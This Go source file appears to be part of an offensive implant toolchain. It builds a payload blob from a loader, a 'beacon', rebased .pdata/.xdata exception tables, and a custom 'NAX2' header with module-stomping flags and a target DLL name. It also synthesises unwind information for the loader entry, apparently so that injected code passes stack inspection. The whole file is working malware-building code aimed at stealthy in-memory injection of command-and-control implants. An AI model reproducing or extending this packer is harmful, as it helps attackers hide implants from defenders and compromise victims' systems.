package main

import (
	"encoding/binary"
	"fmt"
	"os"
	"strings"
	"unicode/utf16"
)

const (
	naxHdrMagic   = 0x4E415832 // "NAX2"
	naxHdrSize    = 160
	naxHdrDllMax  = 64 // max WCHAR chars for DLL name
	flagModStomp  = 0x0001
	flagStompPdat = 0x0002
)

func readTextRVA(path string) (uint32, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return 0, err
	}
	s := strings.TrimSpace(string(data))
	if s == "" {
		return 0, nil
	}
	var rva uint32
	_, err = fmt.Sscanf(s, "%x", &rva)
	return rva, err
}

func normalizePdata(pdata []byte, textRva, xdataRva uint32) []byte {
	if len(pdata) < 12 {
		return pdata
	}
	out := make([]byte, len(pdata))
	copy(out, pdata)
	count := len(out) / 12
	for i := 0; i < count; i++ {
		off := i * 12
		begin := binary.LittleEndian.Uint32(out[off:])
		end := binary.LittleEndian.Uint32(out[off+4:])
		unwind := binary.LittleEndian.Uint32(out[off+8:])
		binary.LittleEndian.PutUint32(out[off:], begin-textRva)
		binary.LittleEndian.PutUint32(out[off+4:], end-textRva)
		binary.LittleEndian.PutUint32(out[off+8:], unwind-xdataRva)
	}
	return out
}

func buildEntryUnwind() (runtimeFunc [12]byte, unwindInfo [12]byte) {
	// RUNTIME_FUNCTION for Entry.asm Start (0x00 to 0x16)
	binary.LittleEndian.PutUint32(runtimeFunc[0:], 0x0000)
	binary.LittleEndian.PutUint32(runtimeFunc[4:], 0x0016)
	binary.LittleEndian.PutUint32(runtimeFunc[8:], 0x0000) // filled later

	// UNWIND_INFO: Version=1, Flags=0, SizeOfProlog=0x0C, CountOfCodes=3
	// FrameRegister=RSI(6), FrameOffset=0
	const (
		uwopPushNonvol = 0
		uwopAllocSmall = 2
		uwopSetFpreg   = 3
		rsi            = 6
	)
	unwindInfo[0] = 0x01                        // Version=1, Flags=0
	unwindInfo[1] = 0x0C                        // SizeOfProlog
	unwindInfo[2] = 3                           // CountOfCodes
	unwindInfo[3] = (0 << 4) | rsi              // FrameOffset=0, FrameRegister=RSI
	unwindInfo[4] = 0x08                        // UnwindCode[0] offset
	unwindInfo[5] = (3 << 4) | uwopAllocSmall   // info=3 (0x20 bytes), op=ALLOC_SMALL
	unwindInfo[6] = 0x01                        // UnwindCode[1] offset
	unwindInfo[7] = (0 << 4) | uwopSetFpreg     // info=0, op=SET_FPREG
	unwindInfo[8] = 0x00                        // UnwindCode[2] offset
	unwindInfo[9] = (rsi << 4) | uwopPushNonvol // info=RSI, op=PUSH_NONVOL
	unwindInfo[10] = 0x00                       // padding
	unwindInfo[11] = 0x00                       // padding

	return
}

func utf16LEEncode(s string) []byte {
	runes := utf16.Encode([]rune(s))
	buf := make([]byte, len(runes)*2)
	for i, r := range runes {
		binary.LittleEndian.PutUint16(buf[i*2:], r)
	}
	return buf
}

func encodeDllName(name string) [128]byte {
	var buf [128]byte
	runes := utf16.Encode([]rune(name))
	for i, r := range runes {
		if i >= naxHdrDllMax-1 {
			break
		}
		binary.LittleEndian.PutUint16(buf[i*2:], r)
	}
	return buf
}

func buildNaxHeader(beaconSize, pdataSize, xdataSize, textRva, flags uint32, dllName string) []byte {
	hdr := make([]byte, naxHdrSize)
	binary.LittleEndian.PutUint32(hdr[0:], naxHdrMagic)
	binary.LittleEndian.PutUint32(hdr[4:], beaconSize)
	binary.LittleEndian.PutUint32(hdr[8:], pdataSize)
	binary.LittleEndian.PutUint32(hdr[12:], xdataSize)
	binary.LittleEndian.PutUint32(hdr[16:], textRva)
	binary.LittleEndian.PutUint32(hdr[20:], flags)
	dll := encodeDllName(dllName)
	copy(hdr[24:24+128], dll[:])
	// remaining 8 bytes are reserved (zero)
	return hdr
}

func align4(n int) int { return (n + 3) &^ 3 }

func packNaxBin(loader, beacon, pdata, xdata []byte, textRva, flags uint32, dllName string) []byte {
	if len(pdata) > 0 && textRva > 0 {
		xdataRva := textRva + uint32(align4(len(beacon))) + uint32(align4(len(pdata)))
		pdata = normalizePdata(pdata, textRva, xdataRva)

		entryRF, entryUI := buildEntryUnwind()
		uiSize := uint32(len(entryUI))

		// Shift existing UnwindData offsets by the prepended UNWIND_INFO size
		for i := 0; i < len(pdata)/12; i++ {
			off := i*12 + 8
			u := binary.LittleEndian.Uint32(pdata[off:])
			binary.LittleEndian.PutUint32(pdata[off:], u+uiSize)
		}

		// Prepend entry RUNTIME_FUNCTION to pdata
		pdata = append(entryRF[:], pdata...)
		// Prepend entry UNWIND_INFO to xdata
		xdata = append(entryUI[:], xdata...)
	}

	hdr := buildNaxHeader(uint32(len(beacon)), uint32(len(pdata)), uint32(len(xdata)), textRva, flags, dllName)

	total := len(loader) + len(hdr) + len(beacon) + len(pdata) + len(xdata)
	payload := make([]byte, 0, total)
	payload = append(payload, loader...)
	payload = append(payload, hdr...)
	payload = append(payload, beacon...)
	payload = append(payload, pdata...)
	payload = append(payload, xdata...)
	return payload
}
